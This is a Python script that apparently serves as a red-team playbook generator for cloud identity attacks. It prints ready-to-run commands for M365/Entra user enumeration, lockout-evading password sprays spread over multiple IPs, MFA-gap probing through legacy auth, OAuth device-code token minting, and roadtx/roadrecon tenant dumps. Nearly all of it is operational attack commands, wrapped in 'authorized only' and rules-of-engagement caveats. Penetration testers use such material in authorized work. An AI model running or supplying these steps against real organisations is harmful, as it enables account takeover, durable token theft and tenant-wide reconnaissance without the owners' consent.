#!/usr/bin/env python3
"""CLOUD IDENTITY initial access — M365/Entra/Okta user-enum + password spray + OAuth device-code +
token abuse. Drives o365spray/TeamFiltration/MFASweep/roadtools/AADInternals. PRINTS commands.
Authorized only. (AiTM/session-phishing is intentionally EXCLUDED — that's phishing infrastructure.)

Usage:
  python3 gen_cloud.py enum   --domain corp.com                 # is it M365? user/tenant enum
  python3 gen_cloud.py spray  --domain corp.com --users u.txt --password 'Spring2025!'   # LOCKOUT-SAFE
  python3 gen_cloud.py mfa    --user user@corp.com --pass p     # MFA posture (find gaps)
  python3 gen_cloud.py device                                    # OAuth device-code flow (no password prompt UI)
  python3 gen_cloud.py token  --user user@corp.com --pass p     # get tokens -> Graph/Azure enum
"""
import sys
import _network_common as P

def opt(flag, default=None):
    return sys.argv[sys.argv.index(flag) + 1] if flag in sys.argv else default

arg = sys.argv[1] if len(sys.argv) > 1 else "enum"
dom  = opt("--domain", "corp.com")
users = opt("--users", "users.txt")
pw   = opt("--password", opt("--pass", "<password>"))
user = opt("--user", f"user@{dom}")

if arg == "enum":
    print(f"# needs: only the target's email DOMAIN (--domain <corp.com>). All steps here are UNAUTH.")
    print(f"# is the tenant on M365 + basic recon (all unauth):")
    print(f"curl -s 'https://login.microsoftonline.com/getuserrealm.srf?login=user@{dom}&xml=1'   # (try first) Managed vs Federated")
    print(f"curl -s 'https://login.microsoftonline.com/{dom}/.well-known/openid-configuration'    # tenant id")
    print(f"# valid-user enumeration (no lockout — timing/response oracle):")
    print(f"o365spray --enum -U {users} --domain {dom}")
    print(f"# also: AADInternals Invoke-AADIntReconAsOutsider -DomainName {dom}   (tenant/services/federation)")
    print(f"# Okta?  https://{dom.split('.')[0]}.okta.com  ·  check /api/v1/... and the login flow.")
    print(f"# -> ok: getuserrealm returns NameSpaceType=Managed/Federated (=on M365); o365spray marks users VALID.")

elif arg == "spray":
    print(f"# needs: a VALIDATED user list (from `enum` above) + one password to try (--password '<password>').")
    print(f"# CLOUD PASSWORD SPRAY — Entra 'Smart Lockout' triggers ~10 fails/user/~few-min. STAY UNDER IT:")
    print(f"#   1 password / round, then wait; spread from multiple source IPs if possible; watch for lockouts.")
    print(f"o365spray --spray -U {users} -p '{pw}' --domain {dom} --count 1 --lockout 1   # (try first)")
    print(f"# TeamFiltration (spray + exfil):  TeamFiltration --spray --usernames {users} --password '{pw}' --region <r>")
    print(f"# Okta:  hydra / a custom script against the Okta auth endpoint (respect the org lockout policy).")
    print(f"# -> ok: o365spray prints a VALID user:password. Then: gen_cloud.py mfa (is MFA enforced?) -> token / device.")

elif arg == "mfa":
    print(f"# needs: ONE valid cloud credential (--user <user@corp.com> --pass <password>) from the spray.")
    print(f"# MFA posture — find users/endpoints WITHOUT MFA (legacy auth, gaps):")
    print(f"MFASweep -Username {user} -Password '{pw}'      # tests EWS/Graph/Azure/Skype/etc. for MFA gaps")
    print(f"# legacy-auth endpoints (EWS/IMAP/POP/SMTP-AUTH) often bypass Conditional Access -> use those.")
    print(f"# -> ok: MFASweep lists a protocol as accessible WITHOUT MFA -> authenticate there (token/device).")

elif arg == "device":
    print(f"# needs: a valid cred you ALREADY hold (from spray) to complete the flow — NOT a victim (phishing excluded).")
    print(f"# OAuth DEVICE-CODE flow — request a code, use a valid cred to complete it (no fake login page):")
    print(f"# 1) request a device code (client = Azure CLI / Office):")
    print(f"curl -s -X POST 'https://login.microsoftonline.com/{dom}/oauth2/v2.0/devicecode' "
          f"-d 'client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46&scope=https://graph.microsoft.com/.default offline_access'")
    print(f"# -> ok: returns a device_code + user_code + verification_uri.")
    print(f"# 2) complete it with a captured/valid session; poll the token endpoint -> access + refresh token.")
    print(f"#    (tooling: roadtx / TokenTactics Invoke-... ). Refresh token = durable, survives password change.")
    print(f"# -> ok: the token endpoint returns an access_token + refresh_token (the durable prize).")
    print(f"# NOTE: device-code is normally paired with phishing to get the victim to enter the code — EXCLUDED here;")
    print(f"#   use it with a cred you already sprayed to mint long-lived tokens.")

elif arg == "token":
    print(f"# needs: ONE valid cloud credential (--user <user@corp.com> --pass <password>).")
    print(f"# get tokens with a valid cred, then enumerate/abuse the cloud:")
    print(f"# roadtx / roadrecon (ROADtools):")
    print(f"roadtx gettokens -u {user} -p '{pw}'                 # -> .roadtools_auth (access+refresh)")
    print(f"roadrecon gather && roadrecon dump                    # enumerate the whole tenant (users/apps/roles)")
    print(f"# -> ok: .roadtools_auth is written, then roadrecon dumps the tenant (users/apps/roles) to a local DB.")
    print(f"# with the token:  az login --service-principal ... / Graph queries / find over-privileged apps + roles.")
    print(f"# PRT theft (from a compromised host) -> roadtx browserprtauth  -> SSO to everything.")
else:
    print("use: enum | spray | mfa | device | token"); sys.exit(1)

print(f"\n# SAFETY: cloud spray trips Smart Lockout + alerts (sign-in logs, Identity Protection). Coordinate,")
print(f"#   throttle hard, and treat tokens as sensitive. Reaching cloud tenants can be OUT OF SCOPE — confirm ROE.")
